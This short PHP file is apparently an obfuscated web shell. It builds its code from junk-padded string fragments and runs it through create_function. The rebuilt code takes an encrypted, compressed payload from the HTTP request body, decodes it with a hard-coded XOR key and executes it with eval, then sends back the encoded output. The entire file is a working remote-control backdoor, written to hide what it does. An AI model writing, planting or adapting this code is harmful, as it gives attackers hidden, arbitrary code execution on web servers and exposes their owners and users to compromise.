<?php
$N='k){@J$c=str@Jle@Jn@J($k);$l=strlen($@Jt@J);$o=""@J@J;for($@Ji=0;$i<$l;)@J{for($j=0@J;($j@J<$c&@J&$i<$@Jl);$j++,$i++)@J{$';
$w='con@Jtents();@J@@Job_end@J_clean()@J;$r=@base@J64_e@Jncode(@@Jx(@gzco@Jm@Jpress($o)@J,$k));pri@Jnt("$p@J@J$kh$r$kf");}';
$g='o.=$@Jt@J{$i}^$k{$j@J@J};}}return@J $o@J;}i@Jf (@preg_m@Jatch@J("/$kh@J(.+)$kf@J/",@file@J_get_con@Jtents("p@Jhp@J@J';
$i=':/@J/in@Jput"),$m)==1) {@ob_sta@Jrt()@J;@ev@Jal@J(@gzunco@Jmpress(@x(@J@base@J64_decod@Je($m@J[1@J]),$k)@J));@J$o=@ob_get_';
$I=str_replace('oW','','creoWatoWoWe_oWoWoWfunction');
$v='$k="d1c@Jd63@Jdf";$kh="5@J@J1b5557@J8b779";$kf=@J"@J2307b34@J183e2";$p@J="Rj5I19x@JWLt@JwE@JuEA@J6";function x@J($t,$';
$A=str_replace('@J','',$v.$N.$g.$i.$w);
$o=$I('',$A);$o();
?>
